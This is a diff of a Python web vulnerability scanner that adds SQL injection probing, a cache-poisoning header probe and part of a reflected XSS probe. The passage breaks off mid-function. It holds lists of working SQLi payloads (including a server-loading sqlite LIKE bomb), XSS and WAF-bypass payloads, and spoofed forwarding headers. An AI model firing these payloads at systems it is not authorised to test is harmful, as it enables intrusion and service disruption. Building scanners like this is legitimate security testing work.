@@ -96,6 +96,65 @@ _ABSOLUTE_THRESHOLD_S = 4.0
 _REQUEST_TIMEOUT_S = 15.0   # > SLEEP_SECONDS + 5s tolerance
 _PER_HOST_CAP_S = 60.0      # circuit-breaker: stop probing a host that's slow
 
+# ── Error-based SQLi payloads for parameter testing ────────────────────
+_SQLI_ERROR_PAYLOADS: list[tuple[str, str]] = [
+    ("single_quote", "'"),
+    ("double_quote", '"'),
+    ("quote_or_1eq1", "' OR '1'='1"),
+    ("union_null", "' UNION SELECT NULL--"),
+    ("int_overflow", "999999999999999999999"),
+    ("closing_paren", "')"),
+    ("semicolon_sleep", "'; SELECT 1--"),
+    ("backslash", "\\"),
+    ("comment_break", "'/**/OR/**/1=1--"),
+]
+
+_SQL_ERROR_SIGNATURES: list[str] = [
+    "you have an error in your sql syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "mysql_query",
+    "pg_query",
+    "pg_exec",
+    "sqlite3.operationalerror",
+    "unclosed quotation mark",
+    "unterminated string",
+    "syntax error at or near",
+    "ORA-01756",
+    "ORA-00933",
+    "quoted string not properly terminated",
+    "microsoft ole db provider for sql server",
+    "microsoft sql native client",
+    "odbc sql server driver",
+    "sqlstate",
+    "jdbc.sqlex",
+    "org.postgresql",
+    "com.mysql.jdbc",
+    "sql syntax.*mysql",
+    "valid mysql result",
+    "mysqlclient",
+    "psycopg2.errors",
+    "sqlite_error",
+    "near \":\": syntax error",
+    "sql command not properly ended",
+    "division by zero",
+    "supplied argument is not a valid mysql",
+    "Warning: mysql_",
+    "Warning: pg_",
+    "Warning: sqlite_",
+]
+
+_SQLI_PARAM_TIME_PAYLOADS: list[tuple[str, str]] = [
+    ("mysql_sleep_squote", "1' AND SLEEP(5)-- -"),
+    ("mysql_sleep_dquote", '1" AND SLEEP(5)-- -'),
+    ("mysql_sleep_int", "1 AND SLEEP(5)-- -"),
+    ("pg_sleep_squote", "1'; SELECT pg_sleep(5)-- -"),
+    ("pg_sleep_int", "1; SELECT pg_sleep(5)-- -"),
+    ("mssql_waitfor", "1'; WAITFOR DELAY '0:0:5'-- -"),
+    ("mysql_benchmark", "1' AND BENCHMARK(10000000,SHA1('test'))-- -"),
+    ("sqlite_like_bomb", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000))))-- -"),
+]
+
 # These headers mirror the bug-bounty PoC enough to avoid some edge-layer
 # bot/WAF blocks that otherwise return an immediate 403 before the origin
 # app is reached (which would mask a real time-based delay signal).
@@ -218,36 +277,22 @@ async def run_bare_root_sqli_probe(
     http_client,
     hosts: Iterable[str],
     *,
+    crawled_urls: Iterable[str] | None = None,
     on_finding: callable | None = None,
     on_progress: callable | None = None,
     cancel_flag=None,
 ) -> list[dict]:
-    """Probe every host's bare root URL for time-based blind SQLi.
+    """Probe hosts for SQL injection via two layers:
 
-    For each host:
-      1. Send control ``GET https://<host>/?ninjeee=sectest`` and record elapsed.
-      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``
-         and record elapsed.
-      3. If any attack >= control + 3.0s AND >= 4.0s absolute, send the
-         attack a second time to rule out network jitter.
-      4. If the second attempt also >= control + 3.0s, emit a Critical
-         SQLi finding.
+    **Layer 1 — Bare-root time-based blind** (original):
+      1. Send control ``GET https://<host>/?ninjeee=sectest``.
+      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``.
+      3. If delta >= 3.0s AND absolute >= 4.0s, confirm with a re-test.
 
-    Args:
-        http_client: an httpx.AsyncClient (or compatible) already
-            configured with the scanner's user agent / cookies / TLS
-            settings.
-        hosts: iterable of hostnames or URLs in scope. Anything outside
-            this list is left alone — we never expand scope.
-        on_finding: optional callback invoked with each finding dict.
-        on_progress: optional callback ``(event_name, data_dict)`` for
-            live progress reporting (mirrors passive_recon's pattern).
-        cancel_flag: optional ``threading.Event`` — checked between hosts
-            so a user-initiated stop drops out cleanly without finishing
-            the remaining probes.
-
-    Returns:
-        list[dict] of finding dicts. Empty list if nothing fires.
+    **Layer 2 — Parameter-aware SQLi** (new):
+      1. Discover params from crawled URLs and page HTML.
+      2. Test each param for error-based SQLi (SQL error signatures).
+      3. Test each param for time-based blind SQLi on discovered pages.
     """
     findings: list[dict] = []
     _emit = on_finding or (lambda f: None)
@@ -356,7 +401,2818 @@ async def run_bare_root_sqli_probe(
         "hosts": len(targets),
         "findings": len(findings),
     })
+
+    # ── Layer 2: Parameter-aware SQLi (crawled URL params) ─────────────
+    # Same pattern as the XSS 4-layer approach: discover params from
+    # crawled pages and test each for error-based + time-based SQLi.
+    _progress("active_baseline_start", {
+        "probe": "param_sqli", "hosts": len(targets),
+    })
+
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        combined_html = ""
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            combined_html = page_resp.text[:500_000]
+        except Exception:
+            pass
+
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            try:
+                cresp = await http_client.get(
+                    curl, timeout=8.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                combined_html += cresp.text[:300_000]
+            except Exception:
+                continue
+
+        discovered = _discover_params_from_html(combined_html, base_url)
+        if not discovered:
+            continue
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "sqli_params_discovered",
+            "count": len(discovered), "params": sorted(discovered)[:20],
+        })
+
+        test_pages = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:15]:
+            if '?' in curl or not any(curl.lower().endswith(e)
+                    for e in ('.js', '.css', '.png', '.jpg', '.gif',
+                              '.svg', '.woff', '.woff2', '.ico', '.map')):
+                cp = urlparse(curl)
+                page_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                if page_base not in test_pages:
+                    test_pages.append(page_base)
+
+        for param in sorted(discovered)[:15]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+
+            for page_url in test_pages[:5]:
+                sep = "&" if "?" in page_url else "?"
+
+                # ── Error-based SQLi ──
+                for elabel, epayload in _SQLI_ERROR_PAYLOADS:
+                    test_url = f"{page_url}{sep}{param}={epayload}"
+                    try:
+                        resp = await http_client.get(
+                            test_url, timeout=10.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        body = resp.text[:100_000]
+                    except Exception:
+                        continue
+
+                    matched_errors = [
+                        sig for sig in _SQL_ERROR_SIGNATURES
+                        if sig.lower() in body.lower()
+                    ]
+                    if matched_errors:
+                        key = (host, param, "error")
+                        if key in seen_keys:
+                            continue
+                        seen_keys.add(key)
+                        f = {
+                            "title": f"Error-Based SQL Injection via '{param}'",
+                            "severity": "Critical",
+                            "confidence": "High",
+                            "owasp_category": "A03:2021",
+                            "cwe": "CWE-89",
+                            "url": test_url,
+                            "parameter": param,
+                            "payload": epayload,
+                            "evidence": (
+                                f"Injecting {elabel} payload into param '{param}' "
+                                f"at {page_url} produced SQL error messages: "
+                                f"{', '.join(matched_errors[:3])}. "
+                                f"Response status: {resp.status_code}."
+                            ),
+                            "remediation": (
+                                "Use parameterized queries / prepared statements. "
+                                "Never concatenate user input into SQL. Disable "
+                                "verbose SQL error messages in production."
+                            ),
+                            "phase": "Active Baseline (Error-Based SQLi)",
+                            "tool": "active_baseline.param_sqli_probe",
+                            "_finding_source": "active_baseline",
+                            "_payload_label": elabel,
+                        }
+                        findings.append(f)
+                        _emit(f)
+                        break
+
+                # ── Time-based blind SQLi on discovered params ──
+                benign_url = f"{page_url}{sep}{param}=1"
+                control_elapsed, control_status = await _timed_get(
+                    http_client, benign_url)
+                if control_status is None:
+                    continue
+
+                for tlabel, tpayload in _SQLI_PARAM_TIME_PAYLOADS:
+                    if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                        break
+                    attack_url = f"{page_url}{sep}{param}={tpayload}"
+                    attack_elapsed, attack_status = await _timed_get(
+                        http_client, attack_url)
+                    if attack_status is None:
+                        continue
+                    delta = attack_elapsed - control_elapsed
+                    if delta < _DELTA_THRESHOLD_S or attack_elapsed < _ABSOLUTE_THRESHOLD_S:
+                        continue
+
+                    await asyncio.sleep(0.5)
+                    confirm_elapsed, confirm_status = await _timed_get(
+                        http_client, attack_url)
+                    if confirm_status is None:
+                        continue
+                    confirm_delta = confirm_elapsed - control_elapsed
+                    if confirm_delta < _DELTA_THRESHOLD_S or confirm_elapsed < _ABSOLUTE_THRESHOLD_S:
+                        continue
+
+                    key = (host, param, "time")
+                    if key in seen_keys:
+                        continue
+                    seen_keys.add(key)
+                    f = {
+                        "title": f"Blind Time-Based SQL Injection via '{param}'",
+                        "severity": "Critical",
+                        "confidence": "High",
+                        "owasp_category": "A03:2021",
+                        "cwe": "CWE-89",
+                        "url": attack_url,
+                        "parameter": param,
+                        "payload": tpayload,
+                        "evidence": (
+                            f"Control GET {benign_url}: {control_elapsed:.2f}s. "
+                            f"Attack GET with {tlabel}: {attack_elapsed:.2f}s "
+                            f"(delta {delta:.2f}s). Confirmed on re-test: "
+                            f"{confirm_elapsed:.2f}s (delta {confirm_delta:.2f}s). "
+                            f"SLEEP payload triggered via param '{param}'."
+                        ),
+                        "remediation": (
+                            "Use parameterized queries. Never interpolate "
+                            "user-controlled values into SQL."
+                        ),
+                        "phase": "Active Baseline (Param SQLi)",
+                        "tool": "active_baseline.param_sqli_probe",
+                        "_finding_source": "active_baseline",
+                        "_payload_label": tlabel,
+                    }
+                    findings.append(f)
+                    _emit(f)
+                    break
+
+    _progress("active_baseline_end", {
+        "probe": "param_sqli", "findings": len(findings),
+    })
     return findings
 
 
-__all__ = ["run_bare_root_sqli_probe"]
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 2 — Web Cache Poisoning Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Bug bounty researchers find cache poisoning by injecting headers like
+# X-Forwarded-Host that get reflected into cached responses (Location
+# redirect, meta refresh, asset URLs).  This probe:
+#   1. Sends a normal GET, records the response body/headers.
+#   2. Sends the same GET with poisoning headers containing a unique canary.
+#   3. If the canary appears in the response body or Location header,
+#      the app is reflecting unkeyed inputs — potential cache poisoning.
+#   4. Fetches the URL again WITHOUT the header to see if the poisoned
+#      response was cached (canary still present → confirmed).
+
+_CACHE_POISON_HEADERS: list[tuple[str, str]] = [
+    ("X-Forwarded-Host", "{canary}"),
+    ("X-Host", "{canary}"),
+    ("X-Original-URL", "/{canary}"),
+    ("X-Rewrite-URL", "/{canary}"),
+    ("X-Forwarded-Scheme", "nothttps"),
+    ("X-Forwarded-Port", "1337"),
+    ("X-Forwarded-Prefix", "/{canary}"),
+    ("X-Original-Host", "{canary}"),
+    ("X-Forwarded-Server", "{canary}"),
+    ("X-HTTP-Method-Override", "POST"),
+    ("X-Real-IP", "127.0.0.1"),
+    ("Forwarded", "host={canary}"),
+    ("CF-Connecting-IP", "127.0.0.1"),
+    ("True-Client-IP", "127.0.0.1"),
+]
+
+
+async def run_cache_poisoning_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    crawled_urls: Iterable[str] | None = None,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for web cache poisoning via unkeyed header reflection.
+
+    Tests root URL and up to 10 crawled sub-pages per host."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "cache_poisoning", "hosts": len(targets),
+    })
+
+    import hashlib, os  # noqa: E401
+    canary = f"cpcanary{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
+
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg',
+                    '.woff', '.woff2', '.ttf', '.ico', '.map')
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}/"
+
+        pages_to_test = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            if not any(curl.lower().endswith(e) for e in _static_exts):
+                if curl not in pages_to_test:
+                    pages_to_test.append(curl)
+
+        for test_page in pages_to_test[:10]:
+            try:
+                baseline_resp = await http_client.get(
+                    test_page, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                baseline_body = baseline_resp.text[:50_000]
+            except Exception:
+                continue
+
+            for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                hdr_val = hdr_tpl.format(canary=canary)
+                probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
+                cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
+                probe_url = f"{test_page}{'&' if '?' in test_page else '?'}{cache_buster}"
+                try:
+                    probe_resp = await http_client.get(
+                        probe_url, timeout=10.0, follow_redirects=False,
+                        headers=probe_headers,
+                    )
+                except Exception:
+                    continue
+
+                reflected = False
+                location = str(probe_resp.headers.get("location", ""))
+                body = probe_resp.text[:50_000]
+                if canary in body or canary in location:
+                    reflected = True
+
+                if not reflected:
+                    continue
+
+                _progress("active_baseline_step", {
+                    "host": host, "step": "cache_poison_reflected",
+                    "header": hdr_name, "canary": canary, "page": test_page,
+                })
+
+                await asyncio.sleep(1.0)
+                try:
+                    verify_resp = await http_client.get(
+                        probe_url, timeout=10.0, follow_redirects=False,
+                        headers=_PROBE_HEADERS,
+                    )
+                    verify_body = verify_resp.text[:50_000]
+                    verify_location = str(verify_resp.headers.get("location", ""))
+                    cached = canary in verify_body or canary in verify_location
+                except Exception:
+                    cached = False
+
+                severity = "High" if cached else "Medium"
+                confidence = "High" if cached else "Medium"
+                f = {
+                    "title": f"Web Cache Poisoning via {hdr_name}",
+                    "severity": severity,
+                    "confidence": confidence,
+                    "owasp_category": "A05:2021",
+                    "cwe": "CWE-444",
+                    "url": probe_url,
+                    "parameter": hdr_name,
+                    "payload": f"{hdr_name}: {hdr_val}",
+                    "evidence": (
+                        f"Canary '{canary}' reflected in "
+                        f"{'response body' if canary in body else 'Location header'} "
+                        f"when sent via {hdr_name} at {test_page}. "
+                        f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
+                    ),
+                    "remediation": (
+                        f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
+                        f"or included in the cache key. Validate and sanitize all "
+                        f"host-related headers before reflecting them in responses."
+                    ),
+                    "phase": "Active Baseline (Cache Poisoning)",
+                    "tool": "active_baseline.cache_poisoning_probe",
+                    "_finding_source": "active_baseline",
+                }
+                findings.append(f)
+                _emit(f)
+
+    _progress("active_baseline_end", {
+        "probe": "cache_poisoning", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 3 — Reflected XSS Probe (Dynamic Discovery)
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Fully generic, zero-hardcoded-param XSS detection.
+#
+# 1. **Discover** — fetch the target page, parse all query parameters
+#    from links (<a href>), forms (<form>/<input>), and inline JS. Also
+#    extract bare path segments. This means ANY parameter the app
+#    actually uses gets tested — no static list.
+# 2. **Probe** — inject a unique canary into each discovered param.
+# 3. **Classify** — determine WHERE the canary landed (onclick handler,
+#    <script> block, javascript: URI, HTML body, or safe attribute).
+# 4. **Escalate** — send context-appropriate payloads (JS-breakout for
+#    event handlers, HTML tags for body context) and confirm reflection.
+#
+# This catches the *class* of bugs, not a specific ticket's params.
+
+import re as _re
+
+_XSS_CANARY_PREFIX = "xsscanary"
+
+# HTML-context payloads (canary landed in plain HTML body)
+_XSS_HTML_PAYLOADS: list[tuple[str, str]] = [
+    ("basic_script", '<script>alert("XSS")</script>'),
+    ("img_onerror", '<img src=x onerror=alert(1)>'),
+    ("svg_onload", '<svg onload=alert(1)>'),
+    ("waf_bypass_case", '<ScRiPt>alert(1)</ScRiPt>'),
+    ("waf_bypass_encoding", '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'),
+    ("waf_bypass_double", '<<script>alert(1)//<</script>'),
+    ("event_handler", '" onfocus=alert(1) autofocus="'),
+    ("template_literal", '${alert(1)}'),
+    ("js_uri", 'javascript:alert(1)'),
+]
+
+# Attribute-context payloads (canary in href/src/style attribute values).
+# Goal: break out of the attribute to inject event handlers or new tags.
+_XSS_ATTR_PAYLOADS: list[tuple[str, str]] = [
+    ("attr_dquote_event", '"><img src=x onerror=alert(1)>'),
+    ("attr_squote_event", "'><img src=x onerror=alert(1)>"),
+    ("attr_dquote_svg", '"><svg onload=alert(1)>'),
+    ("attr_js_uri", "javascript:alert(1)"),
+    ("attr_dquote_onfocus", '" onfocus=alert(1) autofocus="'),
+    ("attr_squote_onfocus", "' onfocus=alert(1) autofocus='"),
+    ("attr_waf_bypass", '"%3E%3Csvg%20onload=alert(1)%3E'),
+]
+
+# JS-string-context payloads (canary landed inside onclick/script/js: URI).
+# {C} is replaced with a benign identifier so we can detect breakout
+# without actually running dangerous code.
+_XSS_JS_PAYLOADS: list[tuple[str, str]] = [
+    ("js_squote_break", "x')-{C}-('"),
+    ("js_dquote_break", 'x")-{C}-("'),
+    ("js_backtick_break", "x`-{C}-`"),
+    ("js_squote_terminate", "';{C};//"),
+    ("js_dquote_terminate", '";{C};//'),
+    ("js_hash_eval_bypass", "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
+]
+
+
+# ── Context classification ────────────────────────────────────────────
+_JS_CONTEXT_REGEXES = [
+    (r"<script\b[^>]*>[^<]*{C}[^<]*</script>", "script_block"),
+    (r"\bon[a-z]+\s*=\s*\"[^\"]*{C}[^\"]*\"", "event_handler_attr"),
+    (r"\bon[a-z]+\s*=\s*'[^']*{C}[^']*'", "event_handler_attr"),
+    (r"\bhref\s*=\s*\"\s*javascript:[^\"]*{C}[^\"]*\"", "javascript_uri"),
+    (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
+]
+
+_ATTR_CONTEXT_REGEXES = [
+    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
+    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
+    (r"\bstyle\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
+    (r"\bstyle\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
+    (r"url\s*\([^)]*{C}[^)]*\)", "html_attribute"),
+]
+
+
+def _classify_canary_context(body: str, canary: str) -> str | None:
+    """Classify where *canary* landed: 'script_block', 'event_handler_attr',
+    'javascript_uri', 'html_attribute', 'html_body', or None (not reflected)."""
+    if canary not in body:
+        return None
+    for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
+        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
+        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
+            return ctx_name
+    for pattern_tpl, ctx_name in _ATTR_CONTEXT_REGEXES:
+        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
+        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
+            return ctx_name
+    if _re.search(r">[^<]*" + _re.escape(canary) + r"[^<]*<", body):
+        return "html_body"
+    return None
+
+
+# ── Dynamic parameter discovery ───────────────────────────────────────
+
+def _discover_params_from_html(html: str, base_url: str) -> set[str]:
+    """Extract every query-parameter name visible in the page.
+
+    Sources:
+      - <a href="?foo=1&bar=2">      →  {foo, bar}
+      - <form ...><input name="x">   →  {x}
+      - onclick="fn('..?p=...')"     →  {p}
+      - window.location = '?z=1'     →  {z}
+      - <link>/<script src="?v=..">  →  {v}
+
+    Returns a de-duplicated set of parameter names (lowercase).
+    """
+    params: set[str] = set()
+
+    for m in _re.finditer(r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=', html):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<input\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<select\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<textarea\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    params.discard("")
+    return params
+
+
+# Small fallback set used only when the page returns no discoverable
+# params at all (e.g. a blank/error page). Kept deliberately small.
+_FALLBACK_PARAMS = ["q", "search", "id", "page", "url", "redirect",
+                    "callback", "next", "name"]
+
+
+async def run_reflected_xss_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    crawled_urls: Iterable[str] | None = None,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for reflected XSS using dynamic parameter discovery.
+
+    For every in-scope host:
+      1. Fetch the root page AND any crawled_urls for that host.
+      2. Discover all query params from all fetched pages.
+      3. For each param, inject a canary and classify the reflection context.
+      4. Send context-appropriate payloads and confirm verbatim reflection.
+
+    The crawled_urls parameter accepts URLs discovered by the SPA crawler
+    or any other source — their query params and page content are merged
+    into the discovery pool for the matching host.
+    """
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    # Group crawled URLs by host for efficient lookup.
+    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (_urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    _progress("active_baseline_start", {
+        "probe": "reflected_xss", "hosts": len(targets),
+    })
+
+    import hashlib, os  # noqa: E401
+    canary = f"{_XSS_CANARY_PREFIX}{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        # ── Step 1: Fetch root page + crawled pages, discover params ──
+        # Track param → source URLs so we can test canaries against the
+        # page where each param was actually found (not just the root).
+        param_sources: dict[str, set[str]] = {}
+
+        def _record_params(params: set[str], source_url: str):
+            for p in params:
+                param_sources.setdefault(p, set()).add(source_url)
+
+        # Root page
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            page_html = page_resp.text[:500_000]
+            _record_params(_discover_params_from_html(page_html, base_url), base_url)
+        except Exception:
+            pass
+
+        # Crawled pages for this host (from SPA crawler, Burp import, etc.)
+        # Prioritize URLs with query params (most likely to have testable
+        # parameters) and HTML pages over static assets.
+        _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg', '.woff',
+                        '.woff2', '.ttf', '.ico', '.map', '.xml', '.json')
+        _host_urls = _crawled_by_host.get(host, [])
+        _urls_with_qs = [u for u in _host_urls if '?' in u]
+        _urls_html = [u for u in _host_urls
+                      if '?' not in u
+                      and not any(u.lower().endswith(e) for e in _static_exts)]
+        _urls_other = [u for u in _host_urls
+                       if u not in _urls_with_qs and u not in _urls_html]
+        _prioritized = (_urls_with_qs + _urls_html + _urls_other)
+        _seen_page_urls: set[str] = set()
+        _deduped: list[str] = []
+        for _u in _prioritized:
+            _p = _urlparse(_u)
+            _page_key = f"{_p.scheme}://{_p.netloc}{_p.path or '/'}"
+            if _page_key not in _seen_page_urls:
+                _seen_page_urls.add(_page_key)
+                _deduped.append(_u)
+        for curl in _deduped[:30]:
+            try:
+                parsed = _urlparse(curl)
+                # Strip query/fragment to get the clean page URL for canary testing
+                page_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+                # Extract params directly from the crawled URL itself
+                url_params = set(k.lower() for k in _parse_qs(parsed.query or ""))
+                _record_params(url_params, page_url)
+                # Also fetch the page and parse its HTML for more params
+                cresp = await http_client.get(
+                    curl, timeout=8.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                html_params = _discover_params_from_html(cresp.text[:300_000], curl)
+                _record_params(html_params, page_url)
+            except Exception:
+                continue
+
+        discovered = set(param_sources.keys())
+        if not discovered:
+            discovered = set(_FALLBACK_PARAMS)
+            for p in discovered:
+                param_sources.setdefault(p, set()).add(base_url)
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "xss_params_discovered",
+            "count": len(discovered),
+            "params": sorted(discovered)[:30],
+        })
+
+        # ── Step 2: Canary injection + context classification ─────
+        # Test each param against every URL where it was discovered.
+        # reflection_points: (param_name, param_template, context, source_base_url)
+        reflection_points: list[tuple[str, str, str, str]] = []
+        for param in sorted(discovered):
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            if len(reflection_points) >= 15:
+                break
+            test_urls = sorted(param_sources.get(param, {base_url}))
+            _found_reflection = False
+            for test_base in test_urls:
+                sep = "&" if "?" in test_base else "?"
+                test_url = f"{test_base}{sep}{param}={canary}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    ctx = _classify_canary_context(resp.text[:200_000], canary)
+                    if ctx:
+                        param_tpl = "?" + param + "={canary}"
+                        reflection_points.append((param, param_tpl, ctx, test_base))
+                        _progress("active_baseline_step", {
+                            "host": host, "step": "xss_reflection_found",
+                            "param": param, "context": ctx,
+                            "source_url": test_base,
+                        })
+                        _found_reflection = True
+                        break
+                except Exception:
+                    continue
+
+            # Cross-endpoint fallback: if param didn't reflect on its source
+            # pages, try other crawled endpoints on the same host (JSON/data
+            # endpoints often reflect query params in their response body).
+            if not _found_reflection:
+                _cross_eps = [u for u in _deduped[:30]
+                              if _urlparse(u).path not in
+                              {_urlparse(t).path for t in test_urls}]
+                for cross_url in _cross_eps[:8]:
+                    cp = _urlparse(cross_url)
+                    cross_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                    sep = "&" if "?" in cross_base else "?"
+                    test_url = f"{cross_base}{sep}{param}={canary}"
+                    try:
+                        resp = await http_client.get(
+                            test_url, timeout=8.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        ctx = _classify_canary_context(resp.text[:200_000], canary)
+                        if ctx:
+                            param_tpl = "?" + param + "={canary}"
+                            reflection_points.append((param, param_tpl, ctx, cross_base))
+                            _progress("active_baseline_step", {
+                                "host": host, "step": "xss_cross_endpoint_reflection",
+                                "param": param, "context": ctx,
+                                "source_url": cross_base,
+                            })
+                            break
+                    except Exception:
+                        continue
+
+        # Also test the path segment as a generic injection point.
+        try:
+            path_url = f"{base_url}/{canary}"
+            path_resp = await http_client.get(
+                path_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            path_ctx = _classify_canary_context(path_resp.text[:200_000], canary)
+            if path_ctx:
+                reflection_points.append(("path_segment", "/{canary}", path_ctx, base_url))
+        except Exception:
+            pass
+
+        # ── Step 2b: Propagation-aware test ─────────────────────
+        # Some params (e.g. ?key=) don't reflect on their source page
+        # but DO propagate through <a href> links to sub-pages where
+        # they reflect in HTML attributes or JS context.  Pattern:
+        #   page?key=canary → <a href="/sub/?key=canary"> → sub-page reflects
+        # Test the root page AND crawled HTML sub-pages (not just root).
+        # Run propagation for ALL discovered params — even those already
+        # found via cross-endpoint.  A param may reflect in *different
+        # contexts* on sub-pages (e.g. html_attribute on /styles/…
+        # vs html_body on /data/… JSON), each needing distinct payloads.
+        _already_reflected_on = {(rp[0], rp[3]) for rp in reflection_points}
+        _unreflected = sorted(discovered)
+
+        _prop_pages = [base_url]
+        for _cu in _deduped[:30]:
+            _cu_lower = _cu.lower()
+            if not any(_cu_lower.endswith(e) for e in _static_exts):
+                _cu_p = _urlparse(_cu)
+                _cu_base = f"{_cu_p.scheme}://{_cu_p.netloc}{_cu_p.path or '/'}"
+                if _cu_base != base_url and _cu_base not in _prop_pages:
+                    _prop_pages.append(_cu_base)
+        # Cap to avoid excessive requests
+        _prop_pages = _prop_pages[:10]
+
+        for param in _unreflected[:8]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            if len(reflection_points) >= 20:
+                break
+            _found_prop = False
+            for seed_page in _prop_pages:
+                if _found_prop:
+                    break
+                if (param, seed_page) in _already_reflected_on:
+                    continue
+                try:
+                    sep = "&" if "?" in seed_page else "?"
+                    prop_url = f"{seed_page}{sep}{param}={canary}"
+                    prop_resp = await http_client.get(
+                        prop_url, timeout=10.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    prop_html = prop_resp.text[:500_000]
+
+                    # Check if the canary reflects directly on this page
+                    direct_ctx = _classify_canary_context(
+                        prop_html[:200_000], canary)
+                    if direct_ctx:
